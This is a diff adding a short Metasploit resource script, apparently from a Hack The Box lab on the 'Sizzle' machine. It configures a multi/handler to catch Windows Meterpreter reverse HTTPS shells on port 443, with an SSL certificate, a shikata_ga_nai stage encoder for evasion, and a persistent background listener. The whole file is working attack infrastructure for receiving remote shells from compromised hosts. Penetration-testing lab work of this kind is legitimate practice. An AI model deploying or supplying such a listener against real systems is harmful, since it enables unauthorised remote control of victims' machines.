@@ -1,0 +1,11 @@
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_winhttps
+set LPORT 443
+set LHOST tun0
+set HandlerSSLCert /home/arti/htb/sizzle/files/amanda.pem
+set StagerVerifySSLCert true
+set StageEncoder x86/shikata_ga_nai
+set SessionCommunicationTimeout 600
+set EXITFUNC thread
+set ExitOnSession false
+run -j
